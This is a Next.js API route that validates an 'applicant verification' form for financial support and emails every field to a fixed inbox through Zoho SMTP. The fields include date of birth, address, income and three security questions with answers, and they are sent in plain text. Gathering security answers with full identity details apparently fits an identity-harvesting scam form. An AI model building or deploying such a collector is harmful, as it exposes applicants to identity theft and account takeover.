import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

const zohoUser = process.env.ZOHO_USER;
const zohoPass = process.env.ZOHO_PASS;
const toEmail = process.env.TO_EMAIL || process.env.ZOHO_USER;

function str(v: unknown): string {
  return typeof v === 'string' ? v.trim() : typeof v === 'number' ? String(v) : '';
}

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function row(label: string, value: string) {
  return `<tr><td style="padding:6px 12px 6px 0;font-weight:600;vertical-align:top;color:#555;">${escapeHtml(label)}</td><td style="padding:6px 0;">${escapeHtml(value)}</td></tr>`;
}

interface VerificationPayload {
  fullName: string;
  email: string;
  phone: string;
  country: string;
  state: string;
  city: string;
  address: string;
  postal: string;
  dateOfBirth: string;
  maritalStatus: string;
  employmentStatus: string;
  monthlyIncome: string;
  employer: string;
  dependents: string;
  category: string;
  amountRequested: string;
  storySummary: string;
  q1: string;
  a1: string;
  q2: string;
  a2: string;
  q3: string;
  a3: string;
  confirm: boolean;
}

function validate(body: unknown): { payload: VerificationPayload } | { error: string } {
  if (!body || typeof body !== 'object') {
    return { error: 'Please complete every field, including three security questions, and confirm the checkbox.' };
  }
  const o = body as Record<string, unknown>;
  const payload: VerificationPayload = {
    fullName: str(o.fullName),
    email: str(o.email),
    phone: str(o.phone),
    country: str(o.country),
    state: str(o.state),
    city: str(o.city),
    address: str(o.address),
    postal: str(o.postal),
    dateOfBirth: str(o.dateOfBirth),
    maritalStatus: str(o.maritalStatus),
    employmentStatus: str(o.employmentStatus),
    monthlyIncome: str(o.monthlyIncome),
    employer: str(o.employer),
    dependents: str(o.dependents),
    category: str(o.category),
    amountRequested: str(o.amountRequested),
    storySummary: str(o.storySummary),
    q1: str(o.q1),
    a1: str(o.a1),
    q2: str(o.q2),
    a2: str(o.a2),
    q3: str(o.q3),
    a3: str(o.a3),
    confirm: o.confirm === true || o.confirm === 'on' || o.confirm === 'true',
  };

  const checks: [string, string][] = [
    [payload.fullName, 'full legal name'],
    [payload.email, 'email'],
    [payload.phone, 'mobile phone'],
    [payload.country, 'country'],
    [payload.state, 'state / region'],
    [payload.city, 'city'],
    [payload.address, 'street mailing address'],
    [payload.postal, 'postal / ZIP code'],
    [payload.dateOfBirth, 'date of birth'],
    [payload.maritalStatus, 'marital status'],
    [payload.employmentStatus, 'employment status'],
    [payload.monthlyIncome, 'monthly income'],
    [payload.employer, 'employer / business name'],
    [payload.dependents, 'number of dependents'],
    [payload.category, 'support category'],
    [payload.amountRequested, 'amount requested'],
    [payload.storySummary, 'summary of why you applied'],
    [payload.q1, 'security question 1'],
    [payload.a1, 'security answer 1'],
    [payload.q2, 'security question 2'],
    [payload.a2, 'security answer 2'],
    [payload.q3, 'security question 3'],
    [payload.a3, 'security answer 3'],
  ];
  const missing = checks.filter(([v]) => !v).map(([, label]) => label);
  if (!payload.confirm) missing.push('the confirmation checkbox at the bottom');

  if (missing.length) {
    return { error: `Please complete: ${missing.join(', ')}.` };
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email)) {
    return { error: 'Please enter a valid email address.' };
  }
  return { payload };
}

export async function POST(request: NextRequest) {
  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: 'Could not read the form. Please try again.' }, { status: 400 });
  }

  const parsed = validate(body);
  if ('error' in parsed) {
    return NextResponse.json({ error: parsed.error }, { status: 400 });
  }
  const { payload } = parsed;

  if (!zohoUser || !zohoPass) {
    return NextResponse.json({ error: 'Submission is temporarily unavailable. Please try again later.' }, { status: 500 });
  }

  const transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 465,
    secure: true,
    auth: { user: zohoUser, pass: zohoPass },
  });

  const html = `
    <h2>Applicant Verification Form — Submitted</h2>
    <table style="border-collapse:collapse;font-size:14px;line-height:1.5;">
      ${row('Full name', payload.fullName)}
      ${row('Email', payload.email)}
      ${row('Phone', payload.phone)}
      ${row('Country', payload.country)}
      ${row('State / Region', payload.state)}
      ${row('City', payload.city)}
      ${row('Address', payload.address)}
      ${row('Postal', payload.postal)}
      ${row('Date of birth', payload.dateOfBirth)}
      ${row('Marital status', payload.maritalStatus)}
      ${row('Employment status', payload.employmentStatus)}
      ${row('Monthly income', payload.monthlyIncome)}
      ${row('Employer / business', payload.employer)}
      ${row('Dependents', payload.dependents)}
      ${row('Category', payload.category)}
      ${row('Amount requested', payload.amountRequested)}
      ${row('Story summary', payload.storySummary)}
      ${row('Security Q1', payload.q1)}
      ${row('Security A1', payload.a1)}
      ${row('Security Q2', payload.q2)}
      ${row('Security A2', payload.a2)}
      ${row('Security Q3', payload.q3)}
      ${row('Security A3', payload.a3)}
    </table>
    <p style="margin-top:16px;color:#666;font-size:12px;">Submitted via https://www.edwinmega.com/documents/verification-form.html</p>
  `;

  try {
    await transporter.sendMail({
      from: zohoUser,
      to: toEmail || zohoUser,
      replyTo: payload.email,
      subject: `[Verification] ${payload.fullName} — ${payload.category}`,
      text: `Verification from ${payload.fullName} (${payload.email})\nDOB: ${payload.dateOfBirth}\nMarital: ${payload.maritalStatus}\nEmployment: ${payload.employmentStatus}\nIncome: ${payload.monthlyIncome}\nCategory: ${payload.category}\nAmount: ${payload.amountRequested}`,
      html,
    });
    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('Verification submit error:', err);
    return NextResponse.json({ error: 'Could not submit your form. Please try again.' }, { status: 500 });
  }
}
